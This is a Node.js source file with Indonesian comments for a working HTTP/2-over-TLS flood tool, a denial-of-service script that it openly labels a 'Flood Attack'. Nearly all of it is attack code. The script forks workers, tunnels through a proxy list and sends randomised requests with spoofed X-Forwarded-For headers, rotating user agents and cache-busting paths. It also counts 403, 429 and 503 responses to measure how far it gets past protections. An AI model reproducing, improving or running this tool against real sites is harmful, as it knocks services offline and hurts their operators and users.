const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://example.com/ 120 16 4`); 
    console.log(`Atau tanpa proxy: node tls.js https://example.com/ 120 16 4 --noproxy`);
    process.exit();
}

// Cek apakah menggunakan proxy atau langsung
const useProxy = process.argv[6] !== "--noproxy";

// Cipher TLS yang lebih lengkap dan modern
const ciphersTLS = [
    // TLS 1.3 ciphers
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_AES_128_CCM_8_SHA256",
    
    // TLS 1.2 ciphers - ECDHE dengan AES-GCM
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    
    // TLS 1.2 ciphers - ECDHE dengan AES-CCM
    "ECDHE-ECDSA-AES256-CCM",
    "ECDHE-ECDSA-AES128-CCM",
    "ECDHE-ECDSA-AES256-CCM8",
    "ECDHE-ECDSA-AES128-CCM8",
    
    // TLS 1.2 ciphers - DHE dengan AES-GCM
    "DHE-RSA-AES256-GCM-SHA384",
    "DHE-RSA-AES128-GCM-SHA256",
    "DHE-DSS-AES256-GCM-SHA384",
    "DHE-DSS-AES128-GCM-SHA256",
    
    // TLS 1.2 ciphers - ECDHE dengan AES-CBC
    "ECDHE-ECDSA-AES256-SHA384",
    "ECDHE-RSA-AES256-SHA384",
    "ECDHE-ECDSA-AES128-SHA256",
    "ECDHE-RSA-AES128-SHA256",
    
    // TLS 1.2 ciphers - DHE dengan AES-CBC
    "DHE-RSA-AES256-SHA256",
    "DHE-RSA-AES128-SHA256",
    "DHE-DSS-AES256-SHA256",
    "DHE-DSS-AES128-SHA256",
    
    // Legacy ciphers yang masih didukung
    "AES256-GCM-SHA384",
    "AES128-GCM-SHA256",
    "AES256-SHA256",
    "AES128-SHA256",
    "AES256-SHA",
    "AES128-SHA"
].join(":");

// ECDH Curves yang lebih lengkap
const ecdhCurves = "x25519:secp256r1:secp384r1:secp521r1:prime256v1";

// Signature Algorithms yang didukung
const signatureAlgorithms = "ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_NO_COMPRESSION;

const secureContextOptions = {
    ciphers: ciphersTLS,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3",
    sigalgs: signatureAlgorithms
};

const secureContext = tls.createSecureContext(secureContextOptions);

// Load proxies jika ada
var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) {
        console.log(`⚠️  No proxy.txt found, using direct connection`);
    }
}

// User Agents yang lebih lengkap dan up-to-date
const userAgents = [
    // Windows 10/11 Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    
    // Windows 10/11 Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    
    // MacOS Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    
    // MacOS Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    
    // Linux Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    
    // iOS Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    
    // Android Chrome
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    // Android Firefox
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0",
    
    // Desktop Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    
    // Bot/Crawler-like
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
];

// Accept headers yang beragam
const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "application/xml, text/xml, */*"
];

// Accept-Encoding yang beragam
const acceptEncodings = [
    "gzip, deflate, br",
    "gzip, deflate",
    "br, gzip, deflate",
    "gzip, deflate, br, zstd"
];

// Accept-Language yang beragam
const acceptLanguages = [
    "en-US,en;q=0.9",
    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

// Statistik global
let stats = {
    total: 0,
    success: 0,
    blocked: 0,
    error: 0,
    active: 0
};

if (cluster.isMaster) {
    console.log(`🔥 Starting Flood Attack`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️  Duration: ${args.time} seconds`);
    console.log(`⚡ Rate: ${args.Rate} req/sec per connection`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`🔒 TLS Version: 1.2 & 1.3`);
    console.log(`🔐 Ciphers: ${ciphersTLS.split(":").length} ciphers`);
    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
    console.log(`====================================`);
    
    // Live stats setiap 2 detik
    const statsInterval = setInterval(() => {
        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
        console.log(`   Total: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        console.log(`   🔗 Active: ${stats.active}`);
    }, 2000);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n✅ Attack Finished!`);
        console.log(`📊 Final Stats:`);
        console.log(`   Total Requests: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        process.exit(1);
    }, args.time * 1000);
} else {
    // Worker processes
    console.log(`Worker ${cluster.worker.id} started`);
    
    // Multiple intervals per worker untuk rate yang lebih tinggi
    const intervalsPerWorker = Math.min(50, args.Rate);
    for (let i = 0; i < intervalsPerWorker; i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.active < 5000) {
                    runFlooder();
                }
            }, Math.max(1, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
        }, i * 10);
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return "";
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIP() {
    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
}

function runFlooder() {
    stats.active++;
    
    const makeRequest = (proxyConn) => {
        const settings = {
            enablePush: false,
            initialWindowSize: 2147483647,
            maxConcurrentStreams: 1000,
            headerTableSize: 65536,
            maxHeaderListSize: 262144
        };

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphersTLS,
            requestCert: false,
            ecdhCurve: ecdhCurves,
            honorCipherOrder: true,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            sigalgs: signatureAlgorithms
        };

        // Jika ada proxy connection, gunakan socket dari proxy
        if (proxyConn) {
            tlsOptions.socket = proxyConn;
        }

        const tlsConn = proxyConn ? 
            tls.connect(443, parsedTarget.host, tlsOptions) :
            tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        let requestInterval;
        
        tlsConn.once("secureConnect", () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: settings,
                createConnection: () => tlsConn,
                maxSessionMemory: 1000,
                maxDeflateDynamicTableSize: 4294967295,
                maxHeaderListSize: 262144
            });

            client.setMaxListeners(0);
            
            const startTime = Date.now();
            
            requestInterval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                if (elapsed > args.time * 1000) {
                    clearInterval(requestInterval);
                    client.destroy();
                    if (proxyConn) proxyConn.destroy();
                    stats.active--;
                    return;
                }
                
                // Random path dengan query parameter yang bervariasi
                const randomPath = parsedTarget.path + 
                    (Math.random() > 0.5 ? "?" + randomString(randomIntn(5,12)) + "=" + randomString(randomIntn(4,10)) + 
                    (Math.random() > 0.7 ? "&" + randomString(randomIntn(4,8)) + "=" + randomString(randomIntn(3,7)) : "") : 
                    "/" + randomString(randomIntn(6,15)) + (Math.random() > 0.8 ? ".html" : ""));
                
                const headers = {
                    [":method"]: Math.random() > 0.9 ? "HEAD" : "GET",
                    [":path"]: randomPath,
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    "user-agent": randomElement(userAgents),
                    "accept": randomElement(acceptHeaders),
                    "accept-language": randomElement(acceptLanguages),
                    "accept-encoding": randomElement(acceptEncodings),
                    "cache-control": Math.random() > 0.7 ? "no-cache" : "max-age=0",
                    "pragma": Math.random() > 0.8 ? "no-cache" : "",
                    "referer": Math.random() > 0.6 ? "https://" + parsedTarget.host + "/" + randomString(randomIntn(3,8)) : "https://" + randomString(randomIntn(5,10)) + ".com",
                    "x-forwarded-for": randomIP(),
                    "x-real-ip": randomIP(),
                    "x-requested-with": Math.random() > 0.8 ? "XMLHttpRequest" : "",
                    "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                    "sec-ch-ua-mobile": Math.random() > 0.7 ? "?1" : "?0",
                    "sec-ch-ua-platform": Math.random() > 0.6 ? '"Windows"' : (Math.random() > 0.5 ? '"macOS"' : '"Linux"'),
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "upgrade-insecure-requests": "1"
                };
                
                // Hapus header kosong
                Object.keys(headers).forEach(key => headers[key] === "" && delete headers[key]);
                
                try {
                    const request = client.request(headers);
                    request.on("response", (responseHeaders) => {
                        const statusCode = responseHeaders[":status"];
                        stats.total++;
                        
                        if (statusCode === 200 || statusCode === 301 || statusCode === 302 || statusCode === 304) {
                            stats.success++;
                        } else if (statusCode === 403 || statusCode === 503 || statusCode === 429 || statusCode === 401) {
                            stats.blocked++;
                        } else {
                            stats.error++;
                        }
                        
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {
                        stats.total++;
                        stats.error++;
                    });
                    
                    // Set timeout untuk request
                    request.setTimeout(5000, () => {
                        request.close();
                        request.destroy();
                    });
                    
                    request.end();
                } catch(e) {
                    stats.total++;
                    stats.error++;
                }
            }, Math.max(5, Math.floor(1000 / args.Rate)));
            
            client.requestInterval = requestInterval;
        });

        tlsConn.on("error", (err) => {
            if (requestInterval) clearInterval(requestInterval);
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        tlsConn.on("timeout", () => {
            if (requestInterval) clearInterval(requestInterval);
            tlsConn.destroy();
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        if (proxyConn) {
            proxyConn.on("error", () => {
                if (requestInterval) clearInterval(requestInterval);
                tlsConn.destroy();
                stats.active--;
            });
            
            proxyConn.on("close", () => {
                if (requestInterval) clearInterval(requestInterval);
                stats.active--;
            });
            
            proxyConn.on("timeout", () => {
                proxyConn.destroy();
                stats.active--;
            });
        }
        
        tlsConn.on("close", () => {
            if (requestInterval) clearInterval(requestInterval);
            stats.active--;
        });
    };
    
    // Jika menggunakan proxy
    if (useProxy && proxies.length > 0) {
        const proxyAddr = randomElement(proxies);
        if (proxyAddr) {
            const parsedProxy = proxyAddr.split(":");
            if (parsedProxy.length >= 2) {
                const proxyConn = net.connect({
                    host: parsedProxy[0],
                    port: ~~parsedProxy[1],
                    allowHalfOpen: true,
                    timeout: 10000
                });
                
                proxyConn.setTimeout(10000);
                proxyConn.setKeepAlive(true, 30000);
                
                const proxyAuth = parsedProxy.length >= 4 ? btoa(parsedProxy[2] + ":" + parsedProxy[3]) : null;
                let payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\nHost: " + parsedTarget.host + "\r\nUser-Agent: " + randomElement(userAgents) + "\r\n";
                if (proxyAuth) payload += "Proxy-Authorization: Basic " + proxyAuth + "\r\n";
                payload += "\r\n";
                
                proxyConn.on("connect", () => {
                    proxyConn.write(payload);
                });
                
                proxyConn.on("data", (chunk) => {
                    const response = chunk.toString();
                    if (response.includes("200 Connection established") || response.includes("HTTP/1.1 200")) {
                        proxyConn.removeAllListeners("data");
                        makeRequest(proxyConn);
                    } else {
                        proxyConn.destroy();
                        stats.active--;
                    }
                });
                
                proxyConn.on("error", () => {
                    stats.active--;
                });
                
                proxyConn.on("timeout", () => {
                    proxyConn.destroy();
                    stats.active--;
                });
                
                return;
            }
        }
    }
    
    // Direct connection (tanpa proxy)
    makeRequest(null);
}

// Helper function untuk Base64 encoding
function btoa(str) {
    return Buffer.from(str).toString('base64');
}

process.on('uncaughtException', (error) => {
    if (stats.active > 0) stats.active--;
});
process.on('unhandledRejection', (error) => {});